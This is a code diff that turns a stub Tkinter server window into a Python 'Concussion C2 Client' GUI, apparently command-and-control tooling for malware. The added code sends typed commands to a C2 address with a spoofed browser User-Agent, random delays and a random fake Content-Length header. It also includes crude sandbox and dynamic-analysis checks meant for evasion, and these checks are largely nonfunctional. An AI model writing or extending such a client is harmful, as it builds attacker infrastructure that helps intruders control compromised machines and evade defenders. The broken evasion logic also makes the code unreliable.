@@ -1,44 +1,88 @@
-import sockets
+import requests
+import random
+import time
+import gzip
+import io
 import tkinter as tk
+import customtkinter  # Import the custom GUI library
 
-# Define the host and port on which the server will listen
-HOST = '127.0.0.1'
-PORT = 8080
+# List of known sandbox artifacts (customize this list)
+sandbox_artifacts = ["sandbox_file.exe", "sandbox_reg_key"]
 
-# Create the main application window
-root = tk.Tk()
-root.title("Concussion C3 Server")
-root.geometry("400x300")  # Adjust the window size as needed
+# Define the C2 server address and port (replace with your server's IP and port)
+C2_SERVER = "http://127.0.0.1:8080"
 
-# Create a dark-blue theme with light-blue font
-custom_theme = {
-    "background": "#000080",  # Dark-blue background color
-    "foreground": "#00FFFF",  # Light-blue font color
-}
+def send_get_request(command):
+    # Introduce a randomized delay before sending GET requests
+    randomized_delay()
 
-# Apply custom theme to the entire GUI
-for element, color in custom_theme.items():
-    root.option_add("*.{element}".format(element=element), color)
+    # Check for known sandbox artifacts before sending the request
+    if check_sandbox_artifacts(command):
+        result_label.config(text="Known sandbox artifacts detected. Execution delayed.")
+        return
 
-# Create a label for the server status
-status_label = tk.Label(root, text="Server Status: Not Running")
-status_label.pack(pady=10)
+    # Create headers with a random content length
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+        'X-Custom-Header': 'MyCustomValue',  # Add your custom header here
+        'Content-Length': str(random.randint(50, 500))  # Random content length
+    }
 
-# Create a button to start the server
-def start_server():
-    # Add server start logic here
-    status_label.config(text="Server Status: Running")
+    # Check for dynamic analysis indicators before sending the request
+    if check_dynamic_analysis(headers):
+        result_label.config(text="Dynamic analysis detected. Execution delayed.")
+        return
 
-start_button = tk.Button(root, text="Start Server", command=start_server)
-start_button.pack()
+    try:
+        response = requests.get(f"{C2_SERVER}/{command}", headers=headers, timeout=10)
+        result_label.config(text=decompress_response(response.content))
+    except requests.exceptions.RequestException as e:
+        result_label.config(text=str(e))
 
-# Create a button to stop the server
-def stop_server():
-    # Add server stop logic here
-    status_label.config(text="Server Status: Not Running")
+def check_sandbox_artifacts(command):
+    # Check for known sandbox artifacts in the received command
+    for artifact in sandbox_artifacts:
+        if artifact in command:
+            return True
+    return False
 
-stop_button = tk.Button(root, text="Stop Server", command=stop_server)
-stop_button.pack()
+def check_dynamic_analysis(headers):
+    # Check for indicators of dynamic analysis (customize this check)
+    # For example, you can look for the presence of debuggers, virtualized environments, or monitoring tools
+    if "debugger" in headers.get('User-Agent', '').lower():
+        return True
+    return False
 
-# Run the GUI application
-root.mainloop()
+def randomized_delay():
+    # Introduce a random delay before sending a request (customize this delay)
+    time.sleep(random.uniform(1, 5))
+
+def decompress_response(response):
+    # Decompress the response using gzip
+    with gzip.GzipFile(fileobj=io.BytesIO(response), mode='rb') as f:
+        decompressed_data = f.read()
+    return decompressed_data.decode('utf-8')
+
+def execute_command():
+    command = command_entry.get()
+    if command:
+        send_get_request(command)
+
+# Create a Tkinter window using the custom GUI library
+window = customtkinter.CTk()
+window.title("Concussion C2 Client")
+
+# Create a label for displaying results
+result_label = customtkinter.CTkLabel(window, text="", wraplength=400)
+result_label.pack()
+
+# Create an entry field for entering commands
+command_entry = customtkinter.CTkEntry(window, width=50, placeholder_text="Enter your command")
+command_entry.pack()
+
+# Create a button to execute commands
+execute_button = customtkinter.CTkButton(window, text="Execute", command=execute_command)
+execute_button.pack()
+
+if __name__ == "__main__":
+    window.mainloop()
